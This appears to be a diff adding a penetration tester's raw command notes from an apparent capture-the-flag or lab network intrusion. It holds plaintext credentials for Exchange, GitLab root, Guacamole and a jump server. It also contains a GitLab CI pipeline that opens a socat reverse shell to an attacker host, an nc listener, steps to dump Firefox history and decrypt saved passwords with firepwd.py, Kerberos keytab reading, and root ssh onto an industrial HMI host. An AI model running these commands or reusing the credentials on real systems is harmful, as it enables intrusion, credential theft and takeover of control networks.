@@ -1,0 +1,82 @@
+--------------------------------------
+nmap -T4 -F --open -oG - 10.8.20.1-254
+------------------------------
+exch_user   T2N0b0AyMDI0   Octo@2024
+emp_admin
+Discovered Credentials gitlab : root \ Bla$ter@123
+Discovered Credentials : guacadmin \ guacadmin
+JUMP SERVER : 172.16.62.10   22   jadmin   Jump@123
+------------------------------------------------------------------------------
+variables:
+  # Variables for reverse shell connection
+  REVERSE_SHELL_HOST: "192.168.100.3"
+  REVERSE_SHELL_PORT: "1234"
+
+stages:
+  - reverse_shell
+
+reverse_shell:
+  stage: reverse_shell
+  script:
+    - |
+      # Set up a reverse shell using socat
+      socat TCP:$REVERSE_SHELL_HOST:$REVERSE_SHELL_PORT EXEC:"bash -li",pty,stderr,setsid,sigint,sane
+
+------------------------------------------------------
+#new
+variables:
+  # Variables for reverse shell connection
+  REVERSE_SHELL_HOST: "192.168.100.150"
+  REVERSE_SHELL_PORT: "6669"
+
+stages:
+  - reverse_shell
+
+reverse_shell:
+  stage: reverse_shell
+  script:
+    - |
+      # Set up a reverse shell using socat
+      socat TCP:$REVERSE_SHELL_HOST:$REVERSE_SHELL_PORT EXEC:"bash -li",pty,stderr,setsid,sigint,sane
+---------------------------------------
+rlwrap nc -lnvp 6669
+-------------------------------------------------------
+find / -name "places.sqlite" 2>/dev/null
+
+cd /home/gitadmin/.mozilla/firefox/a1p8aosd.default-release/
+
+*************  sqlite3 places.sqlite "SELECT url, title FROM moz_places WHERE url LIKE '%10.8.20.25%';"
+---------------------------
+sqlite3 places.sqlite "SELECT b.title, p.url FROM moz_bookmarks AS b
+JOIN moz_places AS p ON b.fk = p.id WHERE b.parent != 4;"
+---------------------------------------------------
+
+python3 firepwd.py -d /home/gitadmin/.mozilla/firefox/a1p8aosd.default-release/
+find / -name firepwd.py 2>/dev/null
+-----------
+python3 /temp/firepwd/firepwd.py -d /home/gitadmin/.mozilla/firefox/a1p8aosd.default-release/
+------------------------------------------------------------------------
+nmap 10.8.20.22
+
+nc -nv 10.8.20.22 1234
+
+-----------------------------------------
+
+ls /etc/krb5.conf
+cat /etc/krb5.conf
+
+kinit jadmin
+Jump@123
+ 
+ klist
+ 
+ kvno host/hmi.pcn.ctrl
+ 
+ sudo klist -k -t /etc/krb5.keytab
+----------------------------
+
+ssh root@hmi.pcn.ctrl -v
+ls
+
+find / -type f -name 'Goal.txt' 2>/dev/null
+md5sum /path/to/Goal.txt
